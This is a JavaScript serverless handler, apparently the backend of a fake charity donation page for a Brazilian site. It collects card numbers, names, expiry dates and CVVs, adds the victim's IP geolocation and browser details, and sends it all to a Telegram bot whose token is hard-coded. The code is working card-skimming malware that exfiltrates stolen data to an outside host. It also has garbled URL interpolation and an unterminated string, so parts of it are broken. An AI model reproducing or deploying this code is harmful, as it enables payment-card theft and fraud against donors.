// api/enviar.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido, só POST' });
    // ou redireciona se quiser: res.redirect('https://doe.savebrasil.org.br/');
  }

  const {
    numero_cartao,
    nome_cartao,
    validade_cartao,
    cvv,
    valor_doacao
  } = req.body;

  if (!numero_cartao || !nome_cartao || !validade_cartao || !cvv || !valor_doacao) {
    return res.status(400).send('Algum campo esta vazio');
  }

  const ip = req.headers['x-forwarded-for'] || req.headers['cf-connecting-ip'] || req.socket.remoteAddress || 'desconhecido';
  const userAgent = req.headers['user-agent'] || 'N/A';
  const acceptLanguage = req.headers['accept-language'] || 'N/A';

  // pegando info do IP (mesma API que você usava)
  let ipInfo = { query: ip, city: 'N/A', regionName: 'N/A', country: 'N/A', isp: 'N/A' };
  try {
    const ipResponse = await fetch(`http://ip-api.com/json/${ip}`);
    ipInfo = await ipResponse.json();
  } catch (e) {
    console.log('Deu ruim no ip-api', e);
  }

  // detecta navegador (bem tosco igual o seu)
  let navegador = 'Desconhecido';
  if (/Firefox/i.test(userAgent)) navegador = 'Firefox';
  else if (/Edg/i.test(userAgent)) navegador = 'Edge';
  else if (/Chrome/i.test(userAgent)) navegador = 'Chrome';
  else if (/Safari/i.test(userAgent)) navegador = 'Safari';
  else if (/OPR|Opera/i.test(userAgent)) navegador = 'Opera';

  const dataHora = new Date().toISOString().replace('T', ' ').split('.')[0];

  const conteudo = 
`🦆 | LOG┃doe.savebrasil.org.br

💳 | Número do Cartão: ${numero_cartao}
🔐 | Nome no Cartão: ${nome_cartao}
📅 | Validade: ${validade_cartao}
🔑 | Cvv/Cvc: ${cvv}
💰 | Valor da Doação: R$ ${valor_doacao}

🏠 | IP: ${ipInfo.query || ip}
🔎 | Cidade: ${ipInfo.city}
📍 | Região: ${ipInfo.regionName}
🌎 | País: ${ipInfo.country}
📦 | ISP: ${ipInfo.isp}

🔓 | USER-AGENT: ${userAgent}
🌐 | NAVEGADOR: ${navegador}
👥 | LINGUAGEM: ${acceptLanguage}
📆 | DATA/HORA: ${dataHora}`;

  const botToken = '8249791748:AAHsushNFJnmQ_eh3QMx4ijxe8y8mVbZa9U';
  const chatId = '-1003531286496';

  const telegramUrl = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${encodeURIComponent(conteudo)}`;

  try {
    const telegramRes = await fetch(telegramUrl);
    if (telegramRes.ok) {
      return res.redirect(302, '/checkout.html');
    } else {
      console.log('Erro ao pagar', await telegramRes.text());
      return res.status(500).send('Erro ao efetuar pagamento);
    }
  } catch (err) {
    console.error(err);
    return res.status(500).send('Fodeu geral');
  }
}
